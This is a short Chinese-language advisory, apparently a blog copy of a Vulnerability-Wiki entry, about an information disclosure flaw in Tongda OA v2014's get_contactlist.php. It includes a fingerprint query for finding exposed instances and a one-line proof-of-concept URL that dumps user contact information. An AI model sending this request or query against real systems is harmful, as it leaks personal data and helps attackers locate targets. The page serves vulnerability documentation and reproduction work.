---
title: "通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞"
date: 2026-10-17 09:13:44
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "通达OA"
tags:
  - "通达OA"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

通达OA v2014 get_contactlist.php文件存在信息泄漏漏洞，攻击者通过漏洞可以获取敏感信息，进一步攻击

## 漏洞影响

```
通达OA v2014
```

## 网络测绘

```
app="TDXK-通达OA"
```

## 漏洞复现

版本信息

![image-20220520154718609](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201547687.png)

验证POC

```
/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
```

![image-20220520154741599](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201547656.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%80%9A%E8%BE%BEOA-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
